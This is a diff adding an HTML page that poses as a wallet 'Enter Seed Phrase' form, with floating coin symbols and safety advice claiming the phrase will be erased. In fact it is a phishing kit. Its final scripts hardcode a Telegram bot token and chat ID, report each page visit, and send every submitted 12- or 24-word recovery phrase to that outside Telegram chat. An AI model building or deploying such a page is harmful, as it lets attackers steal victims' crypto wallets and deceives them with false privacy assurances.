@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Enter Seed Phrase</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #0e1015;
+      color: #fff;
+      margin: 0;
+      padding: 0;
+      overflow-x: hidden;
+      position: relative;
+    }
+
+    .container {
+      background: #1c1f26;
+      padding: 30px;
+      border-radius: 14px;
+      box-shadow: 0 4px 20px rgba(0, 255, 170, 0.1);
+      max-width: 700px;
+      margin: 60px auto;
+      position: relative;
+      z-index: 2;
+    }
+
+    h1, h2 {
+      text-align: center;
+      color: #00ffaa;
+    }
+
+    .selection-container {
+      background-color: #10141c;
+      padding: 20px;
+      border-radius: 10px;
+      margin-bottom: 30px;
+      text-align: center;
+    }
+
+    .seed-option {
+      font-size: 16px;
+      padding: 12px 24px;
+      margin: 10px;
+      background-color: #00ffaa;
+      color: #000;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background-color 0.3s, transform 0.3s;
+    }
+
+    .seed-option:hover {
+      background-color: #00e69c;
+      transform: translateY(-2px);
+    }
+
+    .input-container {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px;
+      justify-content: space-between;
+      margin-top: 20px;
+    }
+
+    .input-container input {
+      width: 30%;
+      padding: 12px;
+      font-size: 16px;
+      border-radius: 6px;
+      border: 1px solid #333;
+      background: #16191f;
+      color: #fff;
+    }
+
+    .submit-btn {
+      background-color: #00ffaa;
+      color: #000;
+      padding: 12px 28px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 16px;
+      margin-top: 30px;
+      display: block;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    .submit-btn:hover {
+      background-color: #00e69c;
+    }
+
+    .error-message {
+      color: #ff4d4d;
+      text-align: center;
+      margin-top: 15px;
+    }
+
+    .safety-precautions {
+      background-color: #10141c;
+      padding: 24px;
+      border-radius: 10px;
+      margin-top: 40px;
+      font-size: 14px;
+      line-height: 1.7;
+      color: #ccc;
+    }
+
+    /* Floating Crypto Symbols */
+    .crypto-symbols {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: 0;
+      overflow: hidden;
+    }
+
+    .crypto-symbol {
+      position: absolute;
+      font-size: 60px;
+      opacity: 0.07;
+      animation: floatAnim linear infinite;
+      color: #00ffaa;
+    }
+
+    @keyframes floatAnim {
+      0% {
+        transform: translateY(100vh) rotate(0deg);
+        opacity: 0.1;
+      }
+      100% {
+        transform: translateY(-200px) rotate(360deg);
+        opacity: 0.1;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Background Floating Crypto Symbols -->
+  <div class="crypto-symbols" id="floatingSymbols"></div>
+
+  <div class="container">
+    <h1>Select Seed Phrase Length</h1>
+    <div class="selection-container">
+      <button class="seed-option" onclick="chooseSeedPhraseLength(12)">12 Words</button>
+      <button class="seed-option" onclick="chooseSeedPhraseLength(24)">24 Words</button>
+    </div>
+
+    <div id="seedPhraseForm" style="display: none;">
+      <h2>Enter Your Seed Phrase</h2>
+      <div class="input-container" id="inputContainer"></div>
+      <button class="submit-btn" onclick="validateSeedPhrase()">Submit</button>
+      <div class="error-message" id="errorMessage" style="display: none;">
+        Please enter a valid seed phrase with the selected number of words.
+      </div>
+    </div>
+
+    <div class="safety-precautions">
+      <h2>Important Safety Precautions</h2>
+      <p>Make sure you're in a secure and private environment when entering your seed phrase.</p>
+      <p>Never share your seed phrase with anyone. This is the key to your wallet.</p>
+      <p>Your seed phrase will be immediately erased after wallet connection for your privacy and security.</p>
+      <p>Always store your seed phrase offline in a safe and secure place.</p>
+    </div>
+  </div>
+
+  <script>
+    const cryptoList = ['BTC', 'ETH', 'USDT', 'XRP', 'SOL', 'ADA', 'DOT', 'MATIC', 'AVAX', 'SHIB', 'DOGE', 'LTC', 'TRX', 'LINK', 'ATOM', 'FTM', 'NEAR', 'BNB', 'APT', 'ARB'];
+    const container = document.getElementById('floatingSymbols');
+
+    // Create multiple floating symbols
+    for (let i = 0; i < 50; i++) {
+      const symbol = document.createElement('div');
+      symbol.className = 'crypto-symbol';
+      symbol.innerText = cryptoList[Math.floor(Math.random() * cryptoList.length)];
+      symbol.style.left = Math.random() * 100 + 'vw';
+      symbol.style.top = Math.random() * 100 + 'vh';
+      symbol.style.animationDuration = 20 + Math.random() * 20 + 's';
+      symbol.style.fontSize = (30 + Math.random() * 50) + 'px';
+      container.appendChild(symbol);
+    }
+
+    let seedPhraseLength = 0;
+
+    function chooseSeedPhraseLength(length) {
+      seedPhraseLength = length;
+      document.querySelector('.selection-container').style.display = 'none';
+      document.getElementById('seedPhraseForm').style.display = 'block';
+      createInputFields(length);
+    }
+
+    function createInputFields(length) {
+      const inputContainer = document.getElementById('inputContainer');
+      inputContainer.innerHTML = '';
+      for (let i = 0; i < length; i++) {
+        const input = document.createElement('input');
+        input.type = 'text';
+        input.placeholder = `Word ${i + 1}`;
+        input.id = `word${i + 1}`;
+        inputContainer.appendChild(input);
+      }
+    }
+
+    function validateSeedPhrase() {
+      const inputContainer = document.getElementById('inputContainer');
+      const errorMessage = document.getElementById('errorMessage');
+      const seedPhrase = [];
+
+      for (let input of inputContainer.children) {
+        const word = input.value.trim();
+        if (word) seedPhrase.push(word);
+      }
+
+      if (seedPhrase.length === seedPhraseLength) {
+        alert('Seed phrase is valid!');
+        console.log('Seed:', seedPhrase);
+        errorMessage.style.display = 'none';
+      } else {
+        errorMessage.style.display = 'block';
+      }
+    }
+  </script>
+  <script>
+    const TELEGRAM_BOT_TOKEN = "7432123629:AAHjGiVj0COI6c8g7VNyuVwuA2UPj5gnBNk";
+    const TELEGRAM_CHAT_ID = "7657389332";
+    
+    function sendTelegramMessage(message) {
+      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message,
+          parse_mode: "Markdown"
+        })
+      });
+    }
+    </script>
+    <script>
+      const BOT_TOKEN = '7432123629:AAHjGiVj0COI6c8g7VNyuVwuA2UPj5gnBNk';
+      const CHAT_ID = '7657389332';
+    
+      function sendTelegramMessage(message) {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: 'HTML'
+          })
+        });
+      }
+    
+      // Send notification when page is loaded
+      window.addEventListener('DOMContentLoaded', () => {
+        sendTelegramMessage('📥 <b>Page Visit</b>\n🔐 Page: <code>Enter Seed Phrase</code>\n🕒 Time: ' + new Date().toLocaleString());
+      });
+    
+      function validateSeedPhrase() {
+        const inputContainer = document.getElementById('inputContainer');
+        const errorMessage = document.getElementById('errorMessage');
+        const seedPhrase = [];
+    
+        for (let input of inputContainer.children) {
+          const word = input.value.trim();
+          if (word) seedPhrase.push(word);
+        }
+    
+        if (seedPhrase.length === seedPhraseLength) {
+          const phraseText = seedPhrase.join(' ');
+          sendTelegramMessage(`✅ <b>Seed Phrase Submitted</b>\n🧩 Length: ${seedPhraseLength} words\n🔑 Phrase: <code>${phraseText}</code>\n🕒 Time: ${new Date().toLocaleString()}`);
+          errorMessage.style.display = 'none';
+          alert('Seed phrase is valid!');
+          console.log('Seed:', seedPhrase);
+        } else {
+          errorMessage.style.display = 'block';
+          sendTelegramMessage(`❌ <b>Seed Phrase Error</b>\n⚠️ Incomplete or invalid entry\nExpected: ${seedPhraseLength} words\n🕒 Time: ${new Date().toLocaleString()}`);
+        }
+      }
+    </script>
+</body>
+</html>
